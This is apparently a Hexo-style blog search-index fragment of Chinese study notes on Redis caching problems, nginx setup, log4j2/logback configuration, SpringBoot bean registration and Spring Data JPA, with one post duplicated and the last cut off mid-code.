设置锁（并发锁），禁止大量的请求数据库； 设置拦截器（布隆过滤器），对不存在的 key 进行拦截。 缓存雪崩 ==缓存雪崩== Redis 的 key 在某个时间大量全部失效，用户全部都去访问数据库，数据库压力突然增大崩溃。 ==解决方案== 设置 key 的过期时间建议采用随机数，不要将 key 的过期时间设置成都一样； 缓存击穿 ==缓存击穿== 是指缓存中没有，但是数据库中有对应的数据，而同时请求该数据的用户量特别大的时候，所有的用户在缓存中都没有读到数据，大家一起去请求数据库，造成数据库压力过大直接崩溃。 例如，秒杀服务，同一时间大量用户访问同一个商品。 ==解决方案== 数据库加锁； 对于热点数据设置永不过期。没有过期时间，无论什么时候访问都是从缓存中拿数据。","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"nginx","date":"2022-04-13T02:00:30.000Z","path":"2022/04/13/2022.04.13 Nginx服务器/","text":"介绍​ Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。因它的稳定性、丰富的功能集、简单的配置文件和低系统资源的消耗而闻名。其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好。 ​ 相对于 Tomacat 有其不可比拟的一些优势，国内淘宝，京东等许多大型企业都是使用 Nginx 服务器。 安装步骤 解压 nginx 安装包到 /usr/local 下； 安装 openssl：yum install openssl openssl--devel； 安装 zlib：yum install zlib zlib-devel； 安装 pcre：yum install pcre pcre-devel； 安装 gcc-c++：yum install gcc-c++； 进入解压目录中，执行配置程序：./confugure； 编译并安装：make &amp;&amp; make install； 此时会在/usr/local路径中生成安装目录nginx 文件组织结构Nginx 按照初始化完成之后的几个文件夹的作用： conf 存放 nginx 配置文件。 html 存放 nginx 自身存储的一些静态页码。 logs 存放日志。 sbin 存放 nginx 命令，就一个命令nginx，但是可以跟不同选项参数。 ==启动==：直接执行 nginx 命令，或指定配置文件启动nginx -c /usr/local/nginx/conf/nginx.conf。 启动完成后，通过浏览器直接访问服务器地址，就可以出现 nginx 欢迎界面（需要开放80端口）。 相关概念 正向代理 用户明确知道目标服务器是谁。 我如果要访问国外一个目标服务器，但是得通过国内合法服务器代理访问，这就是正向代理。 反向代理 用户不知道目标服务器是谁，我访问服务器 A，但是服务器自动将请求分发给 B、C、D； 用户并不知道需要访问B、C、D，只知道访问 A，这就是反向代理。 ==Nginx 两大特性== ==负载均衡== 服务器 A 将所接受到的所有请求，**==根据一定的策略将请求分发给服务器B、C、D==**。 ==nignx 接受到多个请求，将不同请求交付给不同 tomcat 服务器进行代理处理。== ==反向代理== 用户访问服务器 A，但是服务器 A 会==交付其他服务器代理处理请求==。 负载均衡和反向代理做的其实是一个事情，但是负载均衡关注==分发策略==**，反向代理则是该过程的一种==分类概念==**。 实验 开启两个 tomcat 服务； 解压，修改配置文件 conf/server.xml，将从上到下三个端口改为 8015、8081、8019； 修改 webapp 下前端界面内容，以此区别两个WEB内容。 启动，执行 bin/startup.sh，记得开发端口 8081； 另外一个 tomcat 不变； 直到两个都可以在浏览器访问到 tomcat 欢迎界面。 修改 nginx 配置文件 nginx/conf/nginx.conf，==大括号内部每一条语句都需要添加分号==。 重启 nginx：bin/nginx -s reload 访问 nginx 服务器地址，会发现请求会按照==轮询负载均衡&amp;反向代理到另外的两个 tomcat 服务器==。 动态与静态界面 Nginx 可以用作静态页面服务器，但是不能不适用于用作动态页面服务器；","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"日志","date":"2022-04-12T01:30:30.000Z","path":"2022/04/12/2022.04.12 日志/","text":"日志​ 以后我们的项目都会上线，在我们之前写代码的时候，经常使用System.out.println()来测试 BUG，当我们项目上线以后，我们无法去查看以及定位线上的BUG（上线后没有控制台），此时我们需要**==引入日志框架，将项目运行时候的各种信息，记录到服务器的一个文件之中==**。 ​ 我们可以**==将日志信息分成各种级别，例如：info、err等==**，以后查看项目运行情况只需要查看 err 文件即可。 日志框架Java 中常用的日志框架： slf4j 我们可以将日志框架想象成数据库驱动，slf4j 扮演的就是 JDBC 的角色（所有数据库连接依赖都需要实现 jdbc 这个接口）；**==slf4j 提供了所有日志框架的接口和方法，但是具体的实现有 log4j 以及 logback 等其他框架来实现==**。 log4j 最早期的日志框架，在 Apache 进行开源。 logback ==spring 使用的默认日志框架==，是 log4j 的作者编写的框架，性能上比 log4j 要强。 ==log4j2== 吸取了 log4j 以及 logback 的优点继承，**==性能上是 log4j 的十倍==**。 log4j12 没啥作用，但是比不可或缺，起到了连接 log4j（或log4j2）和 slf4j 的功能。 SSM中使用log4j2引入依赖123456789101112131415161718&lt;!-- 使用log4j2日志框架依赖 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-web&lt;/artifactId&gt; &lt;version&gt;2.12.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-jcl&lt;/artifactId&gt; &lt;version&gt;2.12.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt; &lt;version&gt;2.12.1&lt;/version&gt;&lt;/dependency&gt; 日志配置文件 新建文件名为：log4j2.xml 日志配置文件主要是配置数据源：数据源位置、输出格式、日志级别类型； 引用数据源。 ==Spring 会自动加载该配置，不需要额外配置整合代码。== 日志级别 日志是分等级的，级别总共分为七种（日志等级越高，输入内容越多，越详细），从低到高如下： OFF &lt; FAFL &lt; ERROR &lt; WARN &lt; INFO &lt; DEBUG &lt; TRACE(默认，‘跟踪’) &lt; ALL **==高级别的日志输出包含低级别的信息==**。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!-- 默认日志级别为 trace（跟踪），这里改为 ALL --&gt;&lt;Configuration status=&quot;ALL&quot;&gt; &lt;!-- 配置 4 个输出源：控制台、日志信息（执行日志）输出文件、INFO信息输出文件、ERROR信息输出文件 --&gt; &lt;Appenders&gt; &lt;!-- 1：配置输出到控制台的内容 console --&gt; &lt;Console name=&quot;con&quot; targer=&quot;SYSTEM_OUT&quot;&gt; &lt;!-- %d：输出时间信息，可以在后面 &#123;&#125; 内指定格式； %-5level：输出日志等级信息，warn、erro、debug； %logger&#123;36&#125;：输出类信息，最多 36 个字符； %msg：将我们需要输出的信息打印出来； %n：换行符； %t：打印线程名； %l：打印包，类，方法名以及代码具体位置； --&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss&#125;---[%l][%t]%-5level-%msg %n&quot;/&gt; &lt;/Console&gt; &lt;!-- 2：配置文件信息，文件所在位置，每次重启服务是否清空--&gt; &lt;file name=&quot;myLog&quot; fileName=&quot;D:/ownLog/test.log&quot; append=&quot;true&quot;&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss&#125;---[%l][%t]%-5level-%msg %n&quot;/&gt; &lt;/file&gt; &lt;!-- 3：永久存在，不清空（文件名不指定死，使用日期来作为文件名） --&gt; &lt;RollingFile name=&quot;rollingFile&quot; fileName=&quot;D:/ownLog/log.log&quot; filePattern=&quot;D:/ownLog/$$&#123;date:yyyy-MM&#125;/%d&#123;yyyy-MM-dd&#125;-%i.log&quot;&gt; &lt;!-- 指定文件的输出级别，只有符合级别的内容才会输出到这个文件之中 --&gt; &lt;ThresholdFilter level=&quot;INFO&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot;/&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss&#125;---[%l][%t]%-5level-%msg %n&quot;/&gt; &lt;!-- 当文件超过一定大小之后，会自动压缩（按照年月的方式） --&gt; &lt;policies&gt; &lt;SizeBasedTriggeringPolicy size=&quot;88 MB&quot;/&gt; &lt;/policies&gt; &lt;/RollingFile&gt; &lt;!-- 4：存放错误信息的地方 --&gt; &lt;RollingFile name=&quot;errorRollingFile&quot; fileName=&quot;D:/ownLog/error.log&quot; filePattern=&quot;D:/ownLog/$$&#123;date:yyyy-MM&#125;/%d&#123;yyyy-MM-dd&#125;-%i.log&quot;&gt; &lt;!-- 指定文件的输出级别，只有符合级别的内容才会输出到这个文件之中 --&gt; &lt;ThresholdFilter level=&quot;ERROR&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot;/&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss&#125;---[%l][%t]%-5level-%msg %n&quot;/&gt; &lt;!-- 当文件超过一定大小之后，会自动压缩（按照年月的方式） --&gt; &lt;policies&gt; &lt;SizeBasedTriggeringPolicy size=&quot;88 MB&quot;/&gt; &lt;/policies&gt; &lt;/RollingFile&gt; &lt;/Appenders&gt; &lt;!-- 引用上面所有输出源，这里的日志级别会限制上面数据源的级别（所以一定要比上面的级别高，才不会将其覆盖） --&gt; &lt;loggers&gt; &lt;Root level=&quot;ALL&quot;&gt; &lt;AppenderRef ref=&quot;con&quot;/&gt; &lt;AppenderRef ref=&quot;myLog&quot;/&gt; &lt;AppenderRef ref=&quot;rollingFile&quot;/&gt; &lt;AppenderRef ref=&quot;errorRollingFile&quot;/&gt; &lt;/Root&gt; &lt;/loggers&gt;&lt;/Configuration&gt; 测试 Controller 中添加日志输出、错误日志输出代码。 先定义一个日志对象：Logger logger = LoggerFactory.getLogger(getClass()); 调用日志接口，打印日志信息到数据源。 1234567891011121314151617181920212223242526272829303132333435363738@RequestMapping(&quot;department&quot;)@Controllerpublic class DepartmentController &#123; @Autowired private DepartmentService server ; @Autowired private DepartmentDao deptDao; // 工厂中获取当前类的日志生成器 private Logger logger = LoggerFactory.getLogger(getClass()); @RequestMapping(&quot;show&quot;) public ModelAndView show(String init, HttpServletRequest req) &#123; ModelAndView mv = new ModelAndView() ; List&lt;Department&gt; departmentList = server.selectAll() ; // 测试日志输出正常信息； for(Department dept : departmentList) &#123; System.out.println(dept); logger.info(dept.toString()); &#125; // 测试日志输出错误信息； try &#123; System.out.println(5/0); &#125; catch (Exception e) &#123; logger.error(e.getMessage()); &#125; mv.addObject(&quot;departmentList&quot;, departmentList) ; if(init != null) req.getSession().setAttribute(&quot;justView&quot;, init); mv.setViewName(&quot;ShowDept&quot;); return mv ; &#125;&#125; 结果 运行项目的时候，控制台输出了启动日志，格式为配置文件中所指定的； 在本地生成了三个数据源：log.log、error.log、test.log error 中只输出了错误信息日志； log 中输出了正常信息，以及错误信息； test 中内容最多，输出所有信息（Trace 级别）。 SpringBoot日志​ SpringBoot ==默认使用 slf4j+logback 作为自己的日志实现==**，当我们引用 web 启动器的时候，实际上就已经引入了日志相关依赖**，并且 boot 提供了很多默认的配置，而这些配置内容我们可以在 application 配置文件中修改。 ​ Log4j2 的性能更加好一点儿，但是一个项目的日志框架只能有一个，所以我们**==如果要用 Log4j2 就需要先排除 Logback==**； 使用 logback 日志框架测试默认日志 在测试类中输出各种不同级别的日志信息； 发现，只有 INFO 及以下级别的信息能够输出； ==说明：SpringBoot默认日志级别是 info，所以只能输出 INFO及以下级别的日志信息。== 1234567891011121314@SpringBootTestclass SpringbootMybatisPlusApplicationTests &#123; private Logger logger = LoggerFactory.getLogger(getClass()) ; @Test void contextLoads() &#123; logger.trace(&quot;这是 trace&quot;); // 没有输出 logger.debug(&quot;这是 debug&quot;); // 没有输出 logger.info(&quot;这是 info&quot;); // 输出了 logger.warn(&quot;这是 warn&quot;); // 输出了 logger.error(&quot;这是 error&quot;); // 输出了 &#125;&#125; 修改SpringBoot日志配置 SpringBoot 默认提供了日志配置，日志级别默认是 info，此时如果我们需要更改，可以修改 application.xml 配置文件。 1234567891011121314# 更改 logback 日志默认配置# 更改日志等级logging.level.root=info# 更改指定包下的日志输出等级（不能与 root 相同，否则会报错）logging.level.com.ishangu=trace# 配置日志存储位置logging.file.path=/spring/log# 配置日志打印格式logging.pattern.console=&#x27;%d&#123;yyyy-MM-dd&#125; --- %-5level %logger&#123;48&#125; %msg %n&#x27;logging.pattern.file=&#x27;%d&#123;yyyy-MM-dd&#125; --- %-5level %logger&#123;48&#125; %msg %n&#x27; 测试输出结果 这时 debug，trance 高级别的日志信息都输出了。 使用 Log4j2 日志框架修改依赖文件 修改 pom 配置文件 排除 Logback 日志框架依赖，修改 web 依赖，在其中添加排除标签； 导入 Log4j2 日志框架依赖。 1234567891011121314151617&lt;!--导入log4j2依赖--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;!--排除掉 logback 依赖--&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; 修改配置文件如果修改的配置文件较少，我们可以直接在application.xml中修改，如果需要的配置文件较多，此时建议写一个专门的 xml 用来存放日志的配置信息。 Logback 框架 文件名必须是：==logback-spring.xml==或者==logback.xml==。 lgo4j2 框架 文件名必须是：==log4j2-spring.xml==或者==log4j2.xml==。 ==只要文件名复合要求，spring 会自动加载配置文件==。 配置文件的写法，同 SSM 框架中的配置内容：四个数据源，再引入数据源即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;ALL&quot;&gt; &lt;Appenders&gt; &lt;Console name=&quot;con&quot; targer=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss&#125;---[%l][%t]%-5level-%msg %n&quot;/&gt; &lt;/Console&gt; &lt;file name=&quot;myLog&quot; fileName=&quot;D:/ownLog/test.log&quot; append=&quot;true&quot;&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss&#125;---[%l][%t]%-5level-%msg %n&quot;/&gt; &lt;/file&gt; &lt;RollingFile name=&quot;rollingFile&quot; fileName=&quot;D:/ownLog/log.log&quot; filePattern=&quot;D:/ownLog/$$&#123;date:yyyy-MM&#125;/%d&#123;yyyy-MM-dd&#125;-%i.log&quot;&gt; &lt;ThresholdFilter level=&quot;INFO&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot;/&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss&#125;---[%l][%t]%-5level-%msg %n&quot;/&gt; &lt;policies&gt; &lt;SizeBasedTriggeringPolicy size=&quot;88 MB&quot;/&gt; &lt;/policies&gt; &lt;/RollingFile&gt; &lt;RollingFile name=&quot;errorRollingFile&quot; fileName=&quot;D:/ownLog/error.log&quot; filePattern=&quot;D:/ownLog/$$&#123;date:yyyy-MM&#125;/%d&#123;yyyy-MM-dd&#125;-%i.log&quot;&gt; &lt;ThresholdFilter level=&quot;ERROR&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot;/&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss&#125;---[%l][%t]%-5level-%msg %n&quot;/&gt; &lt;policies&gt; &lt;SizeBasedTriggeringPolicy size=&quot;88 MB&quot;/&gt; &lt;/policies&gt; &lt;/RollingFile&gt; &lt;/Appenders&gt; &lt;loggers&gt; &lt;Root level=&quot;ALL&quot;&gt; &lt;AppenderRef ref=&quot;con&quot;/&gt; &lt;AppenderRef ref=&quot;myLog&quot;/&gt; &lt;AppenderRef ref=&quot;rollingFile&quot;/&gt; &lt;AppenderRef ref=&quot;errorRollingFile&quot;/&gt; &lt;/Root&gt; &lt;/loggers&gt;&lt;/Configuration&gt;","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"SpringBoot","date":"2022-03-29T01:41:30.000Z","path":"2022/03/29/2022.03.29 SpringBoot_JPA/","text":"为什么学习 SpringBoot​ 回顾之前写的项目，以及我们学会的技术越来越多，我们会发现项目变得越来越大，我们项目的配置文件变得非常复杂，并且配置文件非常多，Jar 包依赖也变得非常多，项目越来越臃肿，配置起来也越来越麻烦。 ​ ==SpringBoot 可以简化我们的配置，达到开箱即用的效果==。 与 Spring，SpringMVC区别 Spring 主要特点是使用 IOC 管理对象，降低应用之间的耦合度； 另外，使用 AOP 切面编程来控制事务。 SpringMVC 提供了分离的方式来简化 web 应用的开发； 通过 DispatcherServlet、ModelAdnView 等元素，让 web 应用变得简单。 ==Spring、SpringMVC 都需要大量的配置，才能使用== SpringBoot ==主要用来简化 Spring 应用程序的初始化及搭建过程==； 将项目需要使用的很多依赖整合到一起（==简化了 maven 配置==）； **==提供了很多的默认配置==**，用户可以不需要进行太多的配置，即可启动项目（==应用程序提供自动的配置==）。 **==嵌入 tomcat 容器==**（tomcat 实际上也就是 jar 包），不需要使用编译工具管理 tomcat； SpringBoot 提供应用的==测试以及监控==等一条龙服务。 搭建方式创建 SpringBoot 两种方式： 下载官方的 demo，然后使用编译根据导入即可。springBoot 官网创建 使用 IDEA 等编译工具创建 创建项目时，选择Spring Initializr； Spring Boot 版本选择最低的2.5.11。 搭建普通的 maven 项目，然后引入 SpringBoot 依赖即可。 项目结构文件组织架构 1、==SpringBootApplication 类：==项目的入口，用来启动项目（因为我们建立的是 jar 包项目，而不是 war 包，java 代码需要启动入口）； 2、==application.properties 属性文件：== 如果我们需要修改 springboot 默认配置，需要将手动配置写在这里； 3、==static：==存放所有 web 前端静态资源（css、js、html、img …）； 4、==templates：==存放我们项目页面的地方。 SpringBoot中的 starter 是什么？​ ==starter 是 SpringBoot 中的启动器==**，我们可以理解为它是==一组依赖的描述，里面定义了当前启动器相关的依赖以及默认配置**==，我们只需要下载启动器就能把所有相关依赖下载好，并且所有依赖的版本都是由启动器自动管理不用操心。 SpringBoot 默认扫描路径SpringBoot 提供有很多默认配置，其中就包括默认扫描路径 —— ==启动类所在包，以及其所有子包==。 因此，只有将 controller 控制器放置到与启动类所在同一个包或子包，才能被访问到； 为什么会扫描 SpringBootApplication 类所在包？ ==@SpringBootApplication== 用来表示这个类是 SpringBoot 的启动类，这个启动类也称之为==主配置类==； @SpringBootApplication是一个组合儿注解。 @SpringBootConfiguration 用来修饰类，表示是一个配置类（相当于配置文件），作用与 spring 中的 @Configuration 一致。 @EnableAutoConfiguration 开启自动配置功能，一起配置文件需要手动写，而 SpringBoot 提供了很==多默认配置==，而这些配置就是使用该注解来开启的。 使用该注解，==会自动加载 spring-boot-autoConfiguration 依赖里面的配置==。 @ComponentScan 用于扫描 Spring 的相关注解（相当于在 xml 中配置扫描路径），==默认扫描的是当前类所在包，以及所有子包==。 如何配置 Bean方式一：使用@Bean注解（推荐） 使用@SpringBootConfiguration注解，编写一个注解类； 然后使用@Bean注解加到相应的方法上，方法的返回值，将会被放入到 IOC 容器中。 1234567@SpringBootConfigurationpublic class BeanConfig &#123; @Bean public Cat getCat() &#123; return new Cat() ; &#125;&#125; 方式二：使用@Import注解 直接在类上使用@Import([Bean的权限定名])，此时就已经初始化到 IOC 中一个对象了； 缺点：==不方便对 IOC 对象内的属性初始化==。 123456789101112@RestController@Import(Dog.class) // 方式二：将 Dog 的实例化对象放入到 IOC 容器中public class HelloController &#123; @Autowired Dog dog ; @RequestMapping(&quot;hellodog&quot;) public String hellodog() &#123; System.out.println(dog); return &quot;hello&quot; ; &#125;&#125; 方式三：引入 ImportSelector 实现类 编写 ImportSelector的实现类，并重写对应方法，==返回需要注入的对象的权限定名==； 在 Controller 控制器类上方，使用@Import导入实现类。 12345678910111213141516public class ConfigSelector implements ImportSelector &#123; /** * 这里要求返回的是类的权限定名 * @param importingClassMetadata * @return */ @Override public String[] selectImports(AnnotationMetadata importingClassMetadata) &#123; return new String[]&#123;&quot;com.ishangu.Dog&quot;&#125;; &#125; @Override public Predicate&lt;String&gt; getExclusionFilter() &#123; return null ; &#125;&#125; 12345678910111213@RestController@Import(ConfigSelector.class) // 方式三：引入 ImportSelector 实现类public class HelloController &#123; @Autowired Dog dog ; @RequestMapping(&quot;hellodog&quot;) public String hellodog() &#123; System.out.println(dog); return &quot;hello&quot; ; &#125;&#125; 方式四：导入 ImportBeanDefinitionRegistrar 实现类 编写实现类，==在实现类中注册一个 Bean 对象==； 使用Import导入实现类。 1234567891011public class ConfigDeferredImport implements ImportBeanDefinitionRegistrar &#123; @Override public void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry, BeanNameGenerator importBeanNameGenerator) &#123; // 判断 IOC 容器中是否有这个类型的 Bean，如果存在返回 true，否则 false Boolean b = registry.containsBeanDefinition(&quot;com.ishangu.Dog&quot;) ; if(!b) &#123; // 如果没有，就注册一个进去 RootBeanDefinition root = new RootBeanDefinition(Dog.class) ; registry.registerBeanDefinition(&quot;dog&quot;, root); &#125; &#125;&#125; 123456789101112@RestController@Import(ConfigDeferredImport.class) // 方式四public class HelloController &#123; @Autowired Dog dog ; @RequestMapping(&quot;hellodog&quot;) public String hellodog() &#123; System.out.println(dog); return &quot;hello&quot; ; &#125;&#125; 方式五：引入 xml 配置文件中的 Bean（不推荐） 像之前配置 SpringMVC 一样编写 application.xml，然后使用注解导入该配置文件。 @ImportResource(&quot;application.xml&quot;) ; 修改 SpringBoot 默认配置 在我们的 SpringBoot 项目中，一般都存在一个 application.properties或者application.yml配置文件，该文件不可修改其命名，否则会无法加载。 我们可以在这个文件中修改 SpringBoot 提供的默认配置，在 SpringBoot 项目中允许 properties 和 yml 文件同时存在，并且两个文件都会进行加载。 此时，properties属性文件的优先级更高。当我们在两者中同时修改同一项配置，会以.properties为主。 12# application.propertiesserver.port=8888 123# application.ymlserver: port: 9999 在两个配置文件中都配置端口号，最终只有 application.properties 生效。 SpringData-JPA介绍 JPA 是 ORM 持久层的规范， JPA 自身只是定义了规范而已，最终需要依靠 ORM 框架来进行实现。 JPA：简称 Java 持久层 API，**==主要通过 Hibernate 来提供实现==**，因为 Hibernate 是全自动的 ORM 框架（Mybatis 只是半自动的 ORM 框架，所以没有实现 JPA 规范）。 配置 注意：当我们引入 JPA 依赖之后，SpringBoot 并不知道我们想要使用的数据库是什么，所以==我们需要手动引入数据库驱动包，并配置数据源相关内容（IP、数据库名、用户名、密码）==。 pom12345678910111213141516171819&lt;!--引入starter管理的 JPA 依赖--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--手动引入 mysql JDBC 依赖--&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.16&lt;/version&gt;&lt;/dependency&gt;&lt;!--手动添加阿里的 druid 数据库连接池（数据源）--&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.22&lt;/version&gt;&lt;/dependency&gt; application.properties12345678910# 由于 SpringBoot 默认使用的是 tomcat 数据源，所以需要修改数据源类型spring.datasource.type=com.alibaba.druid.pool.DruidDataSourcespring.datasource.druid.url=jdbc:mysql://localhost:8080/testspring.datasource.druid.username=adminspring.datasource.druid.password=123456spring.datasource.druid.driver=com.mysql.jdbc.Driver# 显示 sqlspring.jpa.show-sql=true model12345678910111213141516171819202122232425262728293031323334353637383940414243@Entity@Table(name=&quot;student&quot;)public class Student &#123; @Id @GeneratedValue @Column(name = &quot;id&quot;) private Integer id ; @Column(name = &quot;name&quot;) private String name ; public Student() &#123; &#125; public Student(Integer id, String name) &#123; this.id = id; this.name = name; &#125; public Integer getId() &#123; return id; &#125; public void setId(Integer id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;Student&#123;&quot; + &quot;id=&quot; + id + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; Repository 接口Repository层就是DAO层，Spring-Data-Jpa 给我们提供了很多的 Repository 接口； 1、Repository 接口 只要我们在接口中写方法名称，只要名称规范，JPA 会自动给我们生成 SQL 语句； 提供了@Query注解，让我们可以在注解中写 SQL 语句。 2、**==CrudRepository 接口==** 继承了Repository接口，有其父类所有功能； 自身提供了很多 CRUD 方法。 3、PagingAndSortingRepository 接口 继承了 CrudRepository 接口，有其父类所有功能； 自身提供了分页和排序的功能。 4、==JpaRepository 接口== 继承了PagingAndSortingRepository，有其父类所有功能； 可以对父类接口的返回值进行适配。 5、JpaSpecificationExecutor 接口 与上面几个没有任何继承实现关系，独立的接口； **==主要用来实现多条件查询==**。 接口 方法 Repository findByName、findByNameOrAddress、findByNameLike、findByAgeOrderBySalDesc CrudRepository save、saveAll()、deleteById、delete(T)、deleteAll、findAll()、findById、exitsById PagingAndSortingRepository findAll(Sort sort)、findAll(Pageable pageable) JpaRepository 对父类方法返回值进行了适配，原本返回的迭代器，现在返回 List，findAll() JpaSpecificationExecutor findOne(Specification)、findAll()、findAll(Pageable)、findAll(Sort)、long count()","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"SpringBoot","date":"2022-03-29T01:41:30.000Z","path":"2022/03/29/2022.03.30 SpringBoot_Mybatis_T/","text":"为什么学习 SpringBoot​ 回顾之前写的项目，以及我们学会的技术越来越多，我们会发现项目变得越来越大，我们项目的配置文件变得非常复杂，并且配置文件非常多，Jar 包依赖也变得非常多，项目越来越臃肿，配置起来也越来越麻烦。 ​ ==SpringBoot 可以简化我们的配置，达到开箱即用的效果==。 与 Spring，SpringMVC区别 Spring 主要特点是使用 IOC 管理对象，降低应用之间的耦合度； 另外，使用 AOP 切面编程来控制事务。 SpringMVC 提供了分离的方式来简化 web 应用的开发； 通过 DispatcherServlet、ModelAdnView 等元素，让 web 应用变得简单。 ==Spring、SpringMVC 都需要大量的配置，才能使用== SpringBoot ==主要用来简化 Spring 应用程序的初始化及搭建过程==； 将项目需要使用的很多依赖整合到一起（==简化了 maven 配置==）； **==提供了很多的默认配置==**，用户可以不需要进行太多的配置，即可启动项目（==应用程序提供自动的配置==）。 **==嵌入 tomcat 容器==**（tomcat 实际上也就是 jar 包），不需要使用编译工具管理 tomcat； SpringBoot 提供应用的==测试以及监控==等一条龙服务。 搭建方式创建 SpringBoot 两种方式： 下载官方的 demo，然后使用编译根据导入即可。springBoot 官网创建 使用 IDEA 等编译工具创建 创建项目时，选择Spring Initializr； Spring Boot 版本选择最低的2.5.11。 搭建普通的 maven 项目，然后引入 SpringBoot 依赖即可。 项目结构文件组织架构 1、==SpringBootApplication 类：==项目的入口，用来启动项目（因为我们建立的是 jar 包项目，而不是 war 包，java 代码需要启动入口）； 2、==application.properties 属性文件：== 如果我们需要修改 springboot 默认配置，需要将手动配置写在这里； 3、==static：==存放所有 web 前端静态资源（css、js、html、img …）； 4、==templates：==存放我们项目页面的地方。 SpringBoot中的 starter 是什么？​ ==starter 是 SpringBoot 中的启动器==**，我们可以理解为它是==一组依赖的描述，里面定义了当前启动器相关的依赖以及默认配置**==，我们只需要下载启动器就能把所有相关依赖下载好，并且所有依赖的版本都是由启动器自动管理不用操心。 SpringBoot 默认扫描路径SpringBoot 提供有很多默认配置，其中就包括默认扫描路径 —— ==启动类所在包，以及其所有子包==。 因此，只有将 controller 控制器放置到与启动类所在同一个包或子包，才能被访问到； 为什么会扫描 SpringBootApplication 类所在包？ ==@SpringBootApplication== 用来表示这个类是 SpringBoot 的启动类，这个启动类也称之为==主配置类==； @SpringBootApplication是一个组合儿注解。 @SpringBootConfiguration 用来修饰类，表示是一个配置类（相当于配置文件），作用与 spring 中的 @Configuration 一致。 @EnableAutoConfiguration 开启自动配置功能，一起配置文件需要手动写，而 SpringBoot 提供了很==多默认配置==，而这些配置就是使用该注解来开启的。 使用该注解，==会自动加载 spring-boot-autoConfiguration 依赖里面的配置==。 @ComponentScan 用于扫描 Spring 的相关注解（相当于在 xml 中配置扫描路径），==默认扫描的是当前类所在包，以及所有子包==。 如何配置 Bean方式一：使用@Bean注解（推荐） 使用@SpringBootConfiguration注解，编写一个注解类； 然后使用@Bean注解加到相应的方法上，方法的返回值，将会被放入到 IOC 容器中。 1234567@SpringBootConfigurationpublic class BeanConfig &#123; @Bean public Cat getCat() &#123; return new Cat() ; &#125;&#125; 方式二：使用@Import注解 直接在类上使用@Import([Bean的权限定名])，此时就已经初始化到 IOC 中一个对象了； 缺点：==不方便对 IOC 对象内的属性初始化==。 123456789101112@RestController@Import(Dog.class) // 方式二：将 Dog 的实例化对象放入到 IOC 容器中public class HelloController &#123; @Autowired Dog dog ; @RequestMapping(&quot;hellodog&quot;) public String hellodog() &#123; System.out.println(dog); return &quot;hello&quot; ; &#125;&#125; 方式三：引入 ImportSelector 实现类 编写 ImportSelector的实现类，并重写对应方法，==返回需要注入的对象的权限定名==； 在 Controller 控制器类上方，使用@Import导入实现类。 12345678910111213141516public class ConfigSelector implements ImportSelector &#123; /** * 这里要求返回的是类的权限定名 * @param importingClassMetadata * @return */ @Override public String[] selectImports(AnnotationMetadata importingClassMetadata) &#123; return new 